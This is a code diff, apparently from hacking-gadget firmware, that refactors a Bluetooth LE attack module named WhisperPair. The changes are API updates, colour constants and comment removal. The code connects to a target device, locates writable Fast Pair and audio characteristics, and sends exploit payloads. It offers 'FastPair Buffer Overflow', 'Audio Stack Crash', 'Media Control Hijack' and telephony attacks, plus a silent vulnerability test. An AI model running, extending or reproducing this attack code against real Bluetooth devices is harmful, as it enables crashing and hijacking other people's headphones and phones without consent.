@@ -7,19 +7,21 @@
 
 extern GlobalState globalState;
 extern BruceConfig bruceConfig;
-extern TFT_eSPI tft;
-extern int tftWidth, tftHeight;
+extern tft_logger tft;
+extern volatile int tftWidth, tftHeight;
 
-// ============================================================================
-// BLEAttackManager - FIXES CONNECTION CRASH
-// ============================================================================
+bool isBLEInitialized() {
+    return NimBLEDevice::getAdvertising() != nullptr || 
+           NimBLEDevice::getScan() != nullptr ||
+           NimBLEDevice::getServer() != nullptr;
+}
 
 void BLEAttackManager::prepareForConnection() {
     Serial.println("[BLE] Preparing for attack connection...");
     
     wasScanning = false;
     
-    if(NimBLEDevice::getInitialized()) {
+    if(isBLEInitialized()) {
         if(NimBLEDevice::getScan()) {
             wasScanning = NimBLEDevice::getScan()->isScanning();
             if(wasScanning) {
@@ -50,7 +52,7 @@ void BLEAttackManager::cleanupAfterAttack() {
     
     Serial.println("[BLE] Cleaning up attack mode...");
     
-    if(NimBLEDevice::getInitialized()) {
+    if(isBLEInitialized()) {
         NimBLEDevice::deinit(false);
     }
     
@@ -59,7 +61,7 @@ void BLEAttackManager::cleanupAfterAttack() {
 }
 
 bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient) {
-    if(!NimBLEDevice::getInitialized()) {
+    if(!isBLEInitialized()) {
         Serial.println("[BLE] ERROR: BLE not initialized!");
         return false;
     }
@@ -119,10 +121,6 @@ bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outC
     return true;
 }
 
-// ============================================================================
-// WhisperPairExploit - MAIN ATTACK
-// ============================================================================
-
 NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemoteService* fastpairService) {
     if(!fastpairService) return nullptr;
     
@@ -141,13 +139,11 @@ NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemo
         }
     }
     
-    std::vector<NimBLERemoteCharacteristic*>* chars = fastpairService->getCharacteristics(true);
-    if(chars) {
-        for(auto& ch : *chars) {
-            if(ch->canWrite()) {
-                Serial.println("[WhisperPair] Found writable characteristic (fallback)");
-                return ch;
-            }
+    const std::vector<NimBLERemoteCharacteristic*>& chars = fastpairService->getCharacteristics(true);
+    for(auto& ch : chars) {
+        if(ch->canWrite()) {
+            Serial.println("[WhisperPair] Found writable characteristic (fallback)");
+            return ch;
         }
     }
     
@@ -285,7 +281,7 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         return false;
     }
     
-    showAttackProgress("Target acquired!", TFT_GREEN);
+    showAttackProgress("Target acquired!", 0x07E0);
     delay(500);
     
     bool isVulnerable = false;
@@ -294,7 +290,7 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
     if(performHandshake(pKbpChar)) {
         delay(400);
         
-        showAttackProgress("Sending exploit...", TFT_ORANGE);
+        showAttackProgress("Sending exploit...", 0xFDA0);
         if(sendExploitPayload(pKbpChar)) {
             delay(400);
             
@@ -361,10 +357,6 @@ bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
     return (handshakeOk && exploitSent && crashed);
 }
 
-// ============================================================================
-// AudioAttackService - AUDIO STACK ATTACKS
-// ============================================================================
-
 bool AudioAttackService::findAndAttackAudioServices(NimBLEClient* pClient) {
     if(!pClient || !pClient->isConnected()) return false;
     
@@ -374,35 +366,34 @@ bool AudioAttackService::findAndAttackAudioServices(NimBLEClient* pClient) {
     
     bool anyAttackSuccess = false;
     
-    std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
-    if(!services) return false;
+    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
     
-    for(auto& service : *services) {
+    for(auto& service : services) {
         NimBLEUUID uuid = service->getUUID();
-        String uuidStr = uuid.toString();
+        std::string uuidStr = uuid.toString();
         
-        if(uuidStr.indexOf("110e") != -1 || uuidStr.indexOf("110f") != -1) {
+        if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) {
             Serial.println("[AudioAttack] Found AVRCP service");
             if(attackAVRCP(service)) {
                 anyAttackSuccess = true;
             }
         }
         
-        else if(uuidStr.indexOf("1843") != -1 || uuidStr.indexOf("b4b4") != -1) {
+        else if(uuidStr.find("1843") != std::string::npos || uuidStr.find("b4b4") != std::string::npos) {
             Serial.println("[AudioAttack] Found Media Control service");
             if(attackAudioMedia(service)) {
                 anyAttackSuccess = true;
             }
         }
         
-        else if(uuidStr.indexOf("1124") != -1 || uuidStr.indexOf("1125") != -1) {
+        else if(uuidStr.find("1124") != std::string::npos || uuidStr.find("1125") != std::string::npos) {
             Serial.println("[AudioAttack] Found Telephony service");
             if(attackTelephony(service)) {
                 anyAttackSuccess = true;
             }
         }
         
-        else if(uuidStr.indexOf("1844") != -1) {
+        else if(uuidStr.find("1844") != std::string::npos) {
             Serial.println("[AudioAttack] Found Generic Media service");
             if(attackAudioMedia(service)) {
                 anyAttackSuccess = true;
@@ -433,13 +424,11 @@ bool AudioAttackService::attackAVRCP(NimBLERemoteService* avrcpService) {
     }
     
     if(!pChar) {
-        std::vector<NimBLERemoteCharacteristic*>* chars = avrcpService->getCharacteristics(true);
-        if(chars) {
-            for(auto& ch : *chars) {
-                if(ch->canWrite()) {
-                    pChar = ch;
-                    break;
-                }
+        const std::vector<NimBLERemoteCharacteristic*>& chars = avrcpService->getCharacteristics(true);
+        for(auto& ch : chars) {
+            if(ch->canWrite()) {
+                pChar = ch;
+                break;
             }
         }
     }
@@ -497,13 +486,11 @@ bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
     }
     
     if(!pMediaChar) {
-        std::vector<NimBLERemoteCharacteristic*>* chars = mediaService->getCharacteristics(true);
-        if(chars) {
-            for(auto& ch : *chars) {
-                if(ch->canWrite()) {
-                    pMediaChar = ch;
-                    break;
-                }
+        const std::vector<NimBLERemoteCharacteristic*>& chars = mediaService->getCharacteristics(true);
+        for(auto& ch : chars) {
+            if(ch->canWrite()) {
+                pMediaChar = ch;
+                break;
             }
         }
     }
@@ -624,13 +611,11 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
     }
     
     NimBLERemoteCharacteristic* pChar = nullptr;
-    std::vector<NimBLERemoteCharacteristic*>* chars = pService->getCharacteristics(true);
-    if(chars) {
-        for(auto& ch : *chars) {
-            if(ch->canWrite()) {
-                pChar = ch;
-                break;
-            }
+    const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
+    for(auto& ch : chars) {
+        if(ch->canWrite()) {
+            pChar = ch;
+            break;
         }
     }
     
@@ -662,10 +647,6 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
     return (sent1 || sent2 || sent3);
 }
 
-// ============================================================================
-// UI Helper Functions
-// ============================================================================
-
 void showAttackProgress(const char* message, uint32_t color) {
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("WHISPERPAIR");
@@ -682,13 +663,13 @@ void showAttackProgress(const char* message, uint32_t color) {
 
 void showAttackResult(bool success, const char* message) {
     if(success) {
-        tft.fillScreen(TFT_GREEN);
+        tft.fillScreen(0x07E0);
         drawMainBorderWithTitle("SUCCESS");
-        tft.setTextColor(TFT_BLACK, TFT_GREEN);
+        tft.setTextColor(TFT_BLACK, 0x07E0);
     } else {
-        tft.fillScreen(TFT_RED);
+        tft.fillScreen(0xF800);
         drawMainBorderWithTitle("FAILED");
-        tft.setTextColor(TFT_WHITE, TFT_RED);
+        tft.setTextColor(TFT_WHITE, 0xF800);
     }
     
     tft.setCursor(20, 80);
@@ -699,11 +680,11 @@ void showAttackResult(bool success, const char* message) {
     }
     
     tft.fillRoundRect(tftWidth/2 - 40, 150, 80, 35, 5, TFT_BLACK);
-    tft.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
+    tft.setTextColor(success ? 0x07E0 : 0xF800, TFT_BLACK);
     tft.setCursor(tftWidth/2 - 15, 157);
     tft.print("OK");
     
-    tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? TFT_GREEN : TFT_RED);
+    tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? 0x07E0 : 0xF800);
     tft.setCursor(20, 200);
     tft.print("Press SEL to continue...");
     
@@ -732,13 +713,13 @@ bool confirmAttack(const char* targetName) {
     
     tft.fillRect(20, 170, tftWidth - 40, 60, bruceConfig.bgColor);
     
-    tft.fillRoundRect(50, 175, 80, 35, 5, TFT_GREEN);
-    tft.setTextColor(TFT_BLACK, TFT_GREEN);
+    tft.fillRoundRect(50, 175, 80, 35, 5, 0x07E0);
+    tft.setTextColor(TFT_BLACK, 0x07E0);
     tft.setCursor(65, 182);
     tft.print("YES");
     
-    tft.fillRoundRect(150, 175, 80, 35, 5, TFT_RED);
-    tft.setTextColor(TFT_WHITE, TFT_RED);
+    tft.fillRoundRect(150, 175, 80, 35, 5, 0xF800);
+    tft.setTextColor(TFT_WHITE, 0xF800);
     tft.setCursor(170, 182);
     tft.print("NO");
     
@@ -759,10 +740,6 @@ bool confirmAttack(const char* targetName) {
         delay(50);
     }
 }
-
-// ============================================================================
-// Attack Execution Functions
-// ============================================================================
 
 void runWhisperPairAttack() {
     WhisperPairExploit exploit;
@@ -798,13 +775,9 @@ void runQuickTest() {
     showAttackResult(result, result ? "VULNERABLE!" : "Patched/Safe");
 }
 
-// ============================================================================
-// Main Menu Function
-// ============================================================================
-
 void whisperPairMenu() {
     if(globalState.currentTarget.toString() == "00:00:00:00:00:00") {
-        showAdaptiveMessage("No target selected", "OK", "", "", TFT_RED, true, false);
+        showAdaptiveMessage("No target selected", "OK", "", "", 0xF800, true, false);
         return;
     }
     
@@ -821,23 +794,23 @@ void whisperPairMenu() {
     
     tft.fillRect(20, 120, tftWidth - 40, 140, bruceConfig.bgColor);
     
-    tft.fillRoundRect(30, 125, tftWidth - 60, 30, 5, TFT_DARKGREY);
-    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+    tft.fillRoundRect(30, 125, tftWidth - 60, 30, 5, 0x4208);
+    tft.setTextColor(TFT_WHITE, 0x4208);
     tft.setCursor(40, 130);
     tft.print("SEL: FastPair Buffer Overflow");
     
-    tft.fillRoundRect(30, 160, tftWidth - 60, 30, 5, TFT_DARKGREY);
-    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+    tft.fillRoundRect(30, 160, tftWidth - 60, 30, 5, 0x4208);
+    tft.setTextColor(TFT_WHITE, 0x4208);
     tft.setCursor(40, 165);
     tft.print("NEXT: Audio Stack Crash");
     
-    tft.fillRoundRect(30, 195, tftWidth - 60, 30, 5, TFT_DARKGREY);
-    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+    tft.fillRoundRect(30, 195, tftWidth - 60, 30, 5, 0x4208);
+    tft.setTextColor(TFT_WHITE, 0x4208);
     tft.setCursor(40, 200);
     tft.print("PREV: Media Control Hijack");
     
-    tft.fillRoundRect(30, 230, tftWidth - 60, 30, 5, TFT_DARKGREY);
-    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+    tft.fillRoundRect(30, 230, tftWidth - 60, 30, 5, 0x4208);
+    tft.setTextColor(TFT_WHITE, 0x4208);
     tft.setCursor(40, 235);
     tft.print("U/D: Quick Test (silent)");
     
